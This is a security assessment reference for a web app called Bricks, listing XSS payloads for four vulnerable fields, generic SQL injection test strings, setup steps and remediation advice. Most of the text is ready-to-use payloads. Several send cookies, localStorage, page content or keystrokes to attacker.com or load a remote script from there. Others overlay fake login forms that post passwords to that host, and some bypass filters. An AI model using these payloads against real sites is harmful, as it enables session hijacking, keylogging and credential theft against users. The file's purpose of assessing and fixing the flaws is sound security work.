# XSS and SQLi Vulnerability Payloads Reference

## Table of Contents
1. [XSS Payloads for Bricks Application](#xss-payloads)
2. [SQL Injection Assessment](#sql-injection)
3. [Testing Methodology](#testing-methodology)
4. [Remediation Guide](#remediation)

---

## XSS Payloads for Bricks Application

### Vulnerability Context
The Bricks application has 4 identified XSS vulnerabilities in `app.js` where user-controlled data is rendered without proper escaping.

---

## 1. Payloads for Bounty Field (Line 905)

### Basic Payloads

```javascript
// Payload 1: Script Tag Injection
bounty: "<script>alert('XSS')</script>"

// Payload 2: IMG Tag with onerror
bounty: "<img src=x onerror=alert('XSS')>"

// Payload 3: SVG Injection
bounty: "<svg/onload=alert('XSS')>"

// Payload 4: Input with autofocus
bounty: "<input autofocus onfocus=alert('XSS')>"
```

### Advanced Payloads

```javascript
// Payload 5: Cookie Theft
bounty: "<img src=x onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"

// Payload 6: Session Hijacking
bounty: "<script>new Image().src='http://attacker.com/log?'+document.cookie</script>"

// Payload 7: DOM Manipulation
bounty: "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>"

// Payload 8: Keylogger
bounty: "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>"

// Payload 9: Redirect Attack
bounty: "<script>window.location='http://malicious-site.com'</script>"

// Payload 10: Credential Harvesting
bounty: "<script>document.body.innerHTML='<form action=\"http://attacker.com\"><input type=\"password\" name=\"pass\" placeholder=\"Re-enter password\"><button>Submit</button></form>'</script>"
```

### Encoded/Obfuscated Payloads

```javascript
// Payload 11: HTML Entity Encoding
bounty: "&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;"

// Payload 12: Unicode Encoding
bounty: "\u003cscript\u003ealert('XSS')\u003c/script\u003e"

// Payload 13: Base64 in Data URI
bounty: "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">"

// Payload 14: Hex Encoding
bounty: "<img src=x onerror=\"eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')\">"
```

---

## 2. Payloads for Severity Field (Line 909)

### Context Breaking Payloads

```javascript
// Payload 1: Break out of div tag
severity: "High</div><script>alert('XSS')</script><div class=\""

// Payload 2: Break out with img tag
severity: "Critical</div><img src=x onerror=alert('XSS')><div>"

// Payload 3: Multiple context breaks
severity: "\"></div><script>alert('XSS')</script><div class=\""
```

### Event Handler Injection

```javascript
// Payload 4: onload event
severity: "High\" onload=\"alert('XSS')\" data-x=\""

// Payload 5: onerror event
severity: "Medium\" onerror=\"alert('XSS')\" x=\""

// Payload 6: onclick event
severity: "Low\" onclick=\"alert('XSS')\" class=\""
```

### CSS Injection (for data exfiltration)

```javascript
// Payload 7: CSS-based exfiltration
severity: "High</div><style>*{background:url('http://attacker.com/exfil?data='+document.cookie)}</style><div>"

// Payload 8: Attribute injection
severity: "Critical\" style=\"background:url('http://attacker.com/log') data-x=\""
```

---

## 3. Modal Payloads (Lines 962-963)

### Modal Takeover Payloads

```javascript
// Payload 1: Full modal replacement
bounty: "$5000</span></div><script>document.querySelector('.modal').innerHTML='<h1>Fake Login</h1><form action=\"http://attacker.com\"><input type=\"password\" name=\"p\"><button>Login</button></form>'</script><div><span>"

// Payload 2: Phishing form injection
severity: "High</span><div style=\"position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999\"><form action=\"http://attacker.com\"><h2>Session Expired</h2><input type=\"password\" placeholder=\"Password\"><button>Login</button></form></div><span>"

// Payload 3: Overlay injection
bounty: "<script>document.body.insertAdjacentHTML('beforeend','<div style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center\"><div style=\"background:white;padding:40px;border-radius:10px;color:black\"><h2>Security Alert</h2><p>Your session has expired. Please re-enter credentials:</p><form action=\"http://attacker.com\"><input type=\"text\" placeholder=\"Username\" name=\"u\"><input type=\"password\" placeholder=\"Password\" name=\"p\"><button>Login</button></form></div></div>')</script>"
```

### Data Exfiltration Payloads

```javascript
// Payload 4: Exfiltrate page content
bounty: "<script>fetch('http://attacker.com/steal',{method:'POST',body:document.body.innerHTML})</script>"

// Payload 5: Exfiltrate localStorage
bounty: "<script>fetch('http://attacker.com/steal',{method:'POST',body:JSON.stringify(localStorage)})</script>"

// Payload 6: Beacon API for exfiltration
severity: "<script>navigator.sendBeacon('http://attacker.com/log',JSON.stringify({cookies:document.cookie,url:location.href}))</script>"
```

---

## 4. Inline Event Handler Payloads (Lines 898, 899, 912, 995)

### JavaScript Context Breaking

```javascript
// Payload 1: Break openModal call
id: "1); alert('XSS'); //"
// Results in: onclick="openModal(1); alert('XSS'); //)"

// Payload 2: Execute arbitrary code
id: "1); eval(atob('YWxlcnQoJ1hTUycpOw==')); //"

// Payload 3: Data exfiltration via ID
id: "1); fetch('http://attacker.com?data='+document.cookie); //"

// Payload 4: Multi-statement injection
id: "1); var x=document.createElement('script');x.src='http://attacker.com/evil.js';document.body.appendChild(x); //"
```

### Tag Filter Bypass (even with escapeHtml)

```javascript
// Payload 5: Single quote context breaking
tag: "test'); alert('XSS'); //'"

// Payload 6: Function hijacking
tag: "test'); window.openModal=function(){alert('Hijacked')}; //'"

// Payload 7: Prototype pollution attempt
tag: "test'); Object.prototype.polluted='yes'; //'"
```

---

## Advanced XSS Techniques

### 1. DOM Clobbering

```javascript
bounty: "<form name='modalOverlay'><input name='classList'></form><script>alert('DOM Clobbered')</script>"
```

### 2. Mutation XSS (mXSS)

```javascript
bounty: "<noscript><p title=\"</noscript><img src=x onerror=alert('mXSS')>\"></noscript>"
```

### 3. Polyglot Payloads (works in multiple contexts)

```javascript
bounty: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>'"
```

### 4. WAF Bypass Techniques

```javascript
// Payload 1: Case variation
bounty: "<ScRiPt>alert('XSS')</sCrIpT>"

// Payload 2: Null byte injection
bounty: "<scri\x00pt>alert('XSS')</scri\x00pt>"

// Payload 3: Whitespace variation
bounty: "<img     src=x      onerror=alert('XSS')>"

// Payload 4: Alternative event handlers
bounty: "<body onpageshow=alert('XSS')>"
bounty: "<marquee onstart=alert('XSS')>"
bounty: "<details open ontoggle=alert('XSS')>"
```

---

## SQL Injection Assessment

### Finding: NOT VULNERABLE

The Bricks application is **NOT vulnerable to SQL Injection** for the following reasons:

1. **No Backend Database**
   - The application is purely client-side (React + vanilla JS)
   - No server-side code exists in the repository
   - No database connections or queries

2. **Static Data Sources**
   - All vulnerability data is stored in static JavaScript objects
   - Located in `src/data.js` and `app.js`
   - No dynamic database queries

3. **No API Endpoints**
   - No API calls to external services
   - No form submissions to backend
   - No database interactions

### Example of What SQL Injection Would Look Like (if applicable)

If this application HAD a backend with vulnerable code, these would be test payloads:

```sql
-- Basic SQL Injection Test Payloads
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' ({
admin'--
admin' #
' UNION SELECT NULL--
1' ORDER BY 1--+
1' ORDER BY 2--+
1' UNION SELECT NULL, NULL--+

-- Time-based Blind SQL Injection
1' AND SLEEP(5)--
1'; WAITFOR DELAY '00:00:05'--

-- Error-based SQL Injection
1' AND 1=CONVERT(int, (SELECT @@version))--
1' UNION SELECT table_name FROM information_schema.tables--

-- Boolean-based Blind SQL Injection
1' AND '1'='1
1' AND '1'='2
```

**However, since there is no backend, these payloads have NO EFFECT on this application.**

---

## Testing Methodology

### Step-by-Step Testing Guide

#### 1. Setup Test Environment

```bash
# Clone the repository
git clone https://github.com/Atharv834/Bricks.git
cd Bricks

# Install dependencies
npm install

# Start the development server
npm start
```

#### 2. Inject Test Payloads

Edit `/home/runner/work/Bricks/Bricks/app.js` or `/home/runner/work/Bricks/Bricks/src/data.js`:

```javascript
// Add a test vulnerability to the vulnerabilities array
{
    "id": 9999,
    "name": "XSS Test Vulnerability",
    "type": "Test",
    "severity": "<img src=x onerror=alert('XSS-Severity')>",
    "bounty": "<script>alert('XSS-Bounty')</script>",
    "company": "Security Test",
    "description": "This is a test entry to demonstrate XSS",
    "lessonLearned": "Always escape user input",
    "method": "Manual testing",
    "whenToUse": "During security assessments",
    "tags": ["Test", "XSS", "Security"]
}
```

#### 3. Verify Exploitation

1. Open the application in a browser: `http://localhost:3000`
2. Observe if JavaScript alerts appear (indicating XSS execution)
3. Check browser console for any errors or logs
4. Inspect the DOM to see injected HTML

#### 4. Test Different Attack Vectors

```javascript
// Test 1: Basic XSS
bounty: "<script>alert('XSS')</script>"

// Test 2: Event handler
bounty: "<img src=x onerror=alert('XSS')>"

// Test 3: Context breaking
severity: "High</div><script>alert('XSS')</script><div>"

// Test 4: Data exfiltration simulation
bounty: "<img src=x onerror=\"console.log('Cookie:',document.cookie)\">"
```

---

## Remediation Guide

### Fix #1: Escape All User-Controlled Data

**Current vulnerable code:**
```javascript
<span class="bounty">${bug.bounty}</span>
<div class="severity">${bug.severity}</div>
```

**Fixed secure code:**
```javascript
<span class="bounty">${escapeHtml(bug.bounty)}</span>
<div class="severity">${escapeHtml(bug.severity)}</div>
```

### Fix #2: Remove Inline Event Handlers

**Current vulnerable code:**
```javascript
onclick="openModal(${bug.id})"
onclick="filterByTag('${escapeHtml(tag)}', event)"
```

**Fixed secure code:**
```javascript
// In HTML generation
<article class="bug-card" data-bug-id="${bug.id}">

// Add event listener after rendering
document.querySelectorAll('.bug-card').forEach(card => {
    card.addEventListener('click', () => {
        const bugId = parseInt(card.dataset.bugId);
        openModal(bugId);
    });
});
```

### Fix #3: Implement Content Security Policy

Add to `public/index.html`:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data:; 
               connect-src 'self'; 
               font-src 'self'; 
               object-src 'none'; 
               base-uri 'self'; 
               form-action 'self'; 
               frame-ancestors 'none';">
```

### Fix #4: Migrate to React Components

Since this is already a React app, the `app.js` vanilla JavaScript should be migrated to React components which automatically escape values:

```javascript
// React automatically escapes values in JSX
function BugCard({ bug }) {
    return (
        <div className="bug-card" onClick={() => openModal(bug.id)}>
            <span className="bounty">{bug.bounty}</span>
            <div className="severity">{bug.severity}</div>
        </div>
    );
}
```

---

## Security Testing Checklist

- [x] Test for XSS in bounty field
- [x] Test for XSS in severity field  
- [x] Test for XSS in modal rendering
- [x] Test inline event handler injection
- [x] Verify SQL injection applicability
- [ ] Test Content Security Policy effectiveness
- [ ] Verify all user inputs are sanitized
- [ ] Check for DOM-based XSS
- [ ] Test with different browsers
- [ ] Verify fixes don't break functionality

---

## Additional Resources

### XSS Filter Evasion Cheat Sheet
- https://owasp.org/www-community/xss-filter-evasion-cheatsheet

### XSS Prevention Cheat Sheet
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

### Content Security Policy Reference
- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### SQL Injection Prevention
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

---

## Conclusion

This document provides comprehensive payloads and testing methodology for the identified XSS vulnerabilities in the Bricks application. 

**Key Findings:**
- ✅ **4 XSS vulnerabilities** identified and documented with exploit payloads
- ✅ **SQL Injection: NOT APPLICABLE** - no backend/database in application
- ✅ Remediation guidance provided
- ✅ Testing methodology documented

**Use these payloads responsibly and only in authorized testing environments.**
